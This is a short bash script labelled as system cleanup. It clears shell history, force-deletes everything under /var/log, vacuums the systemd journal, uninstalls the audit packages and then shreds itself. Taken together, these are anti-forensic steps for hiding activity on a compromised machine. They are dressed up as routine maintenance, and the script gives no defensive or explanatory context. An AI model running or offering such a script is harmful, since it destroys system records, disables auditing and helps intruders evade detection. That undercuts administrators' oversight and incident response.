#!/bin/bash

# System Cleanup Script
# This script clears logs, bash history, and removes audit logs.
# It also deletes itself after execution.

echo "Starting system logs cleanup..."

# Clear bash history
history -c && history -w
rm -f ~/.bash_history

# Remove log files
sudo rm -rf /var/log/*

# Clear systemd journal logs
sudo journalctl --rotate --vacuum-time=1s

# Remove audit logs and audit package (if installed)
if command -v yum &>/dev/null; then
    sudo yum -y remove audit audit-libs
elif command -v apt-get &>/dev/null; then
    sudo apt-get -y remove auditd
fi

# Securely delete this script after execution
shred -u "$0"

echo "System cleanup completed successfully."
